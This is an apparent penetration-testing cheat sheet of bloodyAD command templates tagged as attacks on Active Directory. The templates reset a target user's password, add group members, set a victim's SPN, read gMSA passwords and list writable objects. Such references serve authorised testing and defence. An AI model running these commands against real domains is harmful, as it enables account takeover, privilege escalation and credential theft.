# bloodyAD

% adcs, certificate, pki, windows, Active directory, template, shadow credential, gmsa, acls


## bloodyAD - set user password
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p <password> set password <target-user> <new-password>
```

## bloodyAD - add group member
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> add groupMember <target-group> <target-user>
```

## bloodyAD - set user spn
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p <password> set object <victim> serviceprincipalname -v '<service>/<spn>'[]
```

## bloodyAD - read gmsa password
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --dc-ip <target-ip> --host <dc-fqdn> -d <domain> -u <user> -p <password> get object <victim> --attr msDS-ManagedPassword
```

## bloodyAD - get writable
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --dc-ip <target-ip> --host <dc-fqdn> -d <domain> -u <user> -p <password> get writable
```
